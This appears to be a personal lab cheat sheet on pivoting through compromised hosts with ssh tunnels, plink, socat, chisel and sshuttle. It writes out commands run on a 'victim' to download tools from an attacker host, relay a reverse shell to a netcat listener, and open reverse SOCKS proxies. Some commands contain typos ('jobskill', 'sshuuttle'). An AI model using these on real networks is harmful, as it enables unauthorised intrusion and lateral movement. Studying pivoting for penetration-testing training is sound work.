# networking gymnastics

the art of slipping through a port and out another in fancy ways

## ssh tunnel

we have SSH access to 172.16.0.5, and there is a web server on 172.16.0.10. Run this on AttackBox:

```bash
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

* `-L` means to create a link to a **L**ocal port.
* `-f` means to background shell immediately
* `-N` means to not run any commands

After this is set up, you can access 172.16.0.10's website by opening up localhost:8000 on AttackBox's browser

## ssh proxying

```bash
ssh -D 1337 user@172.16.0.5 -fN
```

* `-D` means to open up port 1337 on AttackBox's machine, and whatever it receives on that port will be sent to the 172.16.0.0/24 network
* i think

## reverse connections

generate new set of SSH keys on victim

```bash
ssh-keygen
```

copy the .pub file and paste them to your AttackBox like so:

```bash
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <ssh-public-key>
```

enable ssh

run this

```bash
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

* `-R` - create link to Remote port

example:

```bash
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

this will allow us to access .10 webserver from Kali machine

to create a proxy:

```bash
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

## plink.exe

a windows cli version of putty

transfer plink.exe to victim and create reverse connection

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

example:

```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

be sure to convert OpenSSH keys into Putty keys using puttygen

## socat

used to set up relays. good analogy is a portal gun

get socat onto victim:

on Kali:

```bash
sudo python3 -m http.server 80
```

on victim:

```bash
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

### reverse shell relay

start netcat listener on AttackBox

```bash
nc -nvlp 443
```

use socat on compromised server to start relay:

```bash
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

* `tcp-l:8000` - create a local listener on TCP port 8000
* `tcp:ATTACKING_IP:443` - connect to ATTACKER_IP on 443

this can be used to relay a shell to port 443 on attacking machine.

### port forwarding - easy

compromised server is .5 and target is 3306 of .10, run on compromised server:

```bash
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

* `tcp-l:33060` - victim is listening on 33060
* `tcp:172.16.0.10:3306` - forward to this IP and this address

### port forwarding - quiet

on attacking machine:

```bash
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

* connections go in 8000 and out 8001

on compromised server:

```bash
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

example:

```bash
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

the process that happens;

* you go to 127.0.0.1:8000 on web browser
* whatever goes into 8000 goes out of 8001
* anything going out of 8001 gets sent to compromised server, which is relayed to .10 on 80
* response goes to 8001, which goes to 8000 and forwards to us

### closing processes

```bash
jobskill %number
```

## chisel

chisel needs to be installed on both attacker and victim box

two modes: client and server

### reverse socks proxy

on attacker box:

```bash
./chisel server -p LISTEN_PORT --reverse &
```

on compromised host:

```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

what does this do?

* Set up a chisel listening server
* Use chisel on victim machine to connect back and set up a tunnel
* After connection is successfully established, you should get some message saying what port the proxy is listening to.

### forward socks proxy

on compromised host:

```bash
./chisel server -p LISTEN_PORT --socks5
```

on attacker box:

```bash
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

* `TARGET_IP` - IP of compromised host
* `LISTEN_PORT` - the listening port of chisel server on compromised host
* `PROXY_PORT` - the port that will be opened on our attacker box

with a forward proxy, you need to set your PROXY_PORT to whatever is in your proxychains config

### remote port forward

on attacker box:

```bash
./chisel server -p LISTEN_PORT --reverse &
```

on compromised host:

```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

* `LOCAL_PORT` - port we want to open on attacking machine to link with target port
* `TARGET_IP:TARGET_PORT` - the target that we want to forward connections to
* `LISTEN_PORT` - this port is used to establish the chisel server

### local port forward

on compromised host:

```bash
./chisel server -p LISTEN_PORT
```

on attacker box:

```bash
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

* `LISTEN_IP:LISTEN_PORT` - is the chisel server
* `LOCAL_PORT:TARGET_IP:TARGET_PORT` - same as last time

## sshuttle

simulates a VPN

requirements:

* ssh connection to compromised host
* python installed
* must be Linux

connecting to a server with sshuttle:

```bash
sshuttle -r username@address subnet
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

use `-N` to determine routes automatically:

```bash
sshuuttle -r username@address -N
```

using keys:

```bash
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

if IP of compromised host is in the same subnet, and you get errors, use the `-x` flag:

```bash
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```





